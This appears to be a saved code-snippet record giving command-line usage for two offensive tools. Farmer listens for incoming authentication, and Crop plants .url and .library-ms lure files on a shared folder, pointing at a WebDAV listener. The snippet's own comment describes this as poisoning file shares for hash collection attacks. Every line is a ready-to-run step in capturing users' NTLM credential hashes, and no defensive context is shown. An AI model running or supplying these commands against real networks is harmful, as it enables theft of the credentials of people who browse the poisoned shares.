---
id: 24d7f08f-a2b9-4d8b-a174-68118255bc7d
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:03.328754+00:00'
updated_at: '2023-04-10T20:25:42.978820+00:00'
---

# Code Snippet 24d7f08f

**Language**: ps1

```ps1
# Farmer to receive auth
farmer.exe <port> [seconds] [output]
farmer.exe 8888 0 c:\windows\temp\test.tmp # undefinitely
farmer.exe 8888 60 # one minute

# Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks
crop.exe <output folder> <output filename> <WebDAV server> <LNK value> [options]
Crop.exe \\\\fileserver\\common mdsec.url \\\\workstation@8888\\mdsec.ico
Crop.exe \\\\fileserver\\common mdsec.library-ms \\\\workstation@8888\\mdsec
```


